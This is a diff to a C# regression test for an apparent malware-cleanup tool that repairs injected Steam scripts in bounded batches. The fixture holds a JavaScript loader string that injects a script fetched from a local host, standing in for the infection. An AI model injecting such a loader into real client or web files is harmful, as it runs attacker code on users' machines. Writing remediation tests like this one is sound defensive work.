@@ -13,7 +13,7 @@ internal static partial class Program
 {
     private static async Task TestSteamScriptBatchRegressionAsync(string root)
     {
-        const int scriptCount = 65;
+        const int scriptCount = 260;
         const string loader = ";try{var s=document.createElement(\"script\");s.src=\"http://127.0.0.1:8137/x.js?\"+Date.now();document.head.append(s)}catch{}";
         string fixture = Path.Combine(root, "script-batch-regression-" + Guid.NewGuid().ToString("N"));
         string steam = Path.Combine(fixture, "Steam");
@@ -45,8 +45,8 @@ internal static partial class Program
 
         RemediationBatchPlanner planner = new(rules, layout, residentDirectory);
         RemediationBatchSession residual = await planner.PrepareAsync(findings, report, false);
-        Check("More than 64 residual Steam scripts prepare across bounded batches", residual.Plans.Count >= 2 &&
-            residual.Plans.All(p => p.Actions.Count <= 64) &&
+        Check("More than 256 residual Steam scripts prepare across bounded batches", residual.Plans.Count >= 2 &&
+            residual.Plans.All(p => p.Actions.Count <= RemediationLimits.MaximumActionsPerPlan) &&
             residual.Plans.SelectMany(p => p.Actions).Count(a => a.Type == RemediationActionType.RepairSteamScript) == scriptCount &&
             residual.Targets.Count(t => t.State == RemediationTargetState.Ready) == scriptCount);
 
@@ -76,11 +76,11 @@ internal static partial class Program
         };
         ScanReport sourceReport = new() { Findings = [source, .. findings] };
         RemediationBatchSession sourceOnly = await planner.PrepareAsync([source], sourceReport, false);
-        Check("Source-only selection retains source cleanup and all 65 associated script repairs", CompleteBatch(sourceOnly) &&
+        Check("Source-only selection retains source cleanup and all 260 associated script repairs", CompleteBatch(sourceOnly) &&
             sourceOnly.Targets.Count(t => t.AddedByAssociation && originals.ContainsKey(t.Target) && t.State == RemediationTargetState.Ready) == scriptCount);
 
         RemediationBatchSession allSelected = await planner.PrepareAsync([source, .. findings], sourceReport, false);
-        Check("Source plus more than 64 selected scripts do not form an unplannable group", CompleteBatch(allSelected));
+        Check("Source plus more than 256 selected scripts do not form an unplannable group", CompleteBatch(allSelected));
         var sourceActions = allSelected.Plans.SelectMany((plan, index) => plan.Actions
             .Where(a => a.Type == RemediationActionType.QuarantineFile && a.Target == resident)
             .Select(action => (Action: action, PlanIndex: index))).ToArray();
@@ -131,7 +131,7 @@ internal static partial class Program
         Check("Bulk preparation and failed-result simulation preserve every original file", unchanged);
 
         bool CompleteBatch(RemediationBatchSession session) => session.Plans.Count >= 2 &&
-            session.Plans.All(p => p.Actions.Count <= 64) &&
+            session.Plans.All(p => p.Actions.Count <= RemediationLimits.MaximumActionsPerPlan) &&
             session.Plans.SelectMany(p => p.Actions).Count(a => a.Type == RemediationActionType.RepairSteamScript) == scriptCount &&
             session.Plans.SelectMany(p => p.Actions).Count(a => a.Type == RemediationActionType.QuarantineFile && a.Target == resident) == 1 &&
             session.Targets.Any(t => t.Target == resident && t.State == RemediationTargetState.Ready);
